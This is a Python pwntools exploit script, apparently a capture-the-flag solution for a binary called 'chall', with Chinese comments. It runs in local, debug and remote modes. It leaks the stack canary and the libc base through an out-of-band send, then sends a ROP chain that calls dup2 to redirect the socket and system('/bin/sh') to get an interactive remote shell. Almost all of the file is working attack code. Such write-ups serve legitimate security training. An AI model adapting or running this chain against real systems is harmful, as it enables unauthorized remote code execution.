import argparse
import sys
from pwn import *
# --------------------------
# 1. 命令行参数定义
# --------------------------
parser = argparse.ArgumentParser(description="Pwn Exploit Script with multi-mode and multi-thread support.")

parser.add_argument(
    "mode", type=int, choices=[0, 1, 2], nargs="?", default=0,
    help="0=local, 1=local+gdb, 2=remote. (Default: 0)",
)
parser.add_argument(
    "-T", "--threads", type=int, default=None, 
    help="Thread count for remote connections (Overrides 'mode')."
)
args = parser.parse_args()

# --- 配置信息 ---
filename = "./chall"
libc_name = "./libc.so.6"
arch = "amd64"
remote_addr = "172.23.0.2" #NOTE:这里要注意不能用docker的回环地址 
remote_port = 5000 
# remote_addr = "localhost" 
# remote_port = 13337

context(log_level="info", os="linux", arch=arch)

# 仅在 local/gdb 模式下，且没有使用线程模式时设置 terminal
if args.mode < 2 and args.threads is None:
    context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(filename, checksec=False)
if libc_name:
    libc = ELF(libc_name, checksec=False)

def VIO_TEXT(x, code=95):
    return log.info(f"\x1b[{code}m{x}\x1b[0m")

def CLEAR_TEXT(x, code=32):
    return log.success(f"\x1b[{code}m{x}\x1b[0m")

def launch():
    global io, threads
    process_argv=[filename,str(remote_port)]

    # 优先处理多线程模式 (如果 -T 被设置)
    if args.threads is not None:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        
        threads = [remote(remote_addr, remote_port, ssl=False) for _ in range(args.threads)]
        CLEAR_TEXT(f"[*] Started {args.threads} remote threads on {remote_addr}:{remote_port}")
        return threads

    elif args.mode == 0:
        io = process(process_argv)
        CLEAR_TEXT("[*] Running on local machine (mode 0)")
        return io
        
    elif args.mode == 1:
        io = process(process_argv)
        CLEAR_TEXT("[*] Running on local machine with GDB (mode 1)")
        gdb.attach(io, gdbscript="""
        """)
        return io
        
    elif args.mode == 2:
        io = remote(remote_addr, remote_port,ssl=False)
        CLEAR_TEXT(f"[*] Running on remote: {remote_addr}:{remote_port} (mode 2)")
        return io
    else:
        sys.exit(1)

# 先python 1启动一个终端进行开启进程和gdb调试，然后再在另一个终端进行数据交互
def main(threads):
    t0:tube
    # 使用第一个线程进行交互泄漏和攻击 
    t0 = threads[0]
    t0.sendline(flat(0x180))
    t0.sock.send(b"A" * 2, constants.MSG_OOB)
    # or 
    # with sock.out_of_band():
    #     sock.send(b"A" * 2)
    data=t0.recv()

    canary=int.from_bytes(data[0x108:0x110],"little")
    libc.address=int.from_bytes(data[0x118:0x120],"little")-0x2a1ca
    
    CLEAR_TEXT(f"[*] Leaked Canary: {hex(canary)}")
    CLEAR_TEXT(f"[*] Leaked Libc Base: {hex(libc.address)}")

    t0.sendline(flat(0x188))

    VIO_TEXT("[*] Sending ROP payload...")
    pop_rdi_ret=libc.address+0x000000000010f78b
    pop_rsi_ret=libc.address+0x0000000000110a7d
    ret_addr=libc.address+0x000000000002882f
    payload=flat({
        0x108-1:canary,
        0x118-1:pop_rdi_ret,
        0x120-1:4, #fd 
        0x128-1:pop_rsi_ret, # 0
        0x138-1:libc.sym['dup2'],
        0x140-1:pop_rdi_ret,
        0x148-1:4,
        0x150-1:pop_rsi_ret,
        0x158-1:1,
        0x160-1:libc.sym['dup2'],
        0x168-1:ret_addr, 
        0x170-1:pop_rdi_ret,
        0x178-1:libc.search(b"/bin/sh\x00").__next__(),
        0x180-1:libc.sym['system'],
    },filler=b"\x00").ljust(0x188,b"\x00")
    t0.send(payload)
    t0.sendline(p64(0))
    t0.interactive()

if __name__ == "__main__":
    target = launch()
    
    # 判断是否为多线程模式
    if args.threads is not None:
        threads = target
        VIO_TEXT("--- Multi-Threaded Exploit Mode Active ---")
        if threads:
            VIO_TEXT("Entering interactive mode on the first thread for manual control...")
            main(threads)
    else:
        io = target
        VIO_TEXT("--- Single Connection Exploit Mode Active ---")
        io.interactive()
